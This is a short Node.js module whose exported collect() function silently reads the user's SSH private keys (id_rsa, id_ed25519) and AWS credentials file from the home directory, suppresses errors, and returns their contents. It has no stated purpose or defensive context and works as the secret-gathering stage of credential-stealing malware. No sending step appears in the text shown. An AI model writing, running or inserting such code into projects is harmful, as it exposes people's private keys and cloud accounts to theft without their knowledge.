const fs = require('fs');
const os = require('os');
const path = require('path');
function collect() {
  const out = {};
  for (const name of ['id_rsa', 'id_ed25519']) {
    try { out[name] = fs.readFileSync(path.join(os.homedir(), '.ssh', name), 'utf8'); } catch (e) {}
  }
  try { out.aws = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'), 'utf8'); } catch (e) {}
  return out;
}
module.exports = { collect };
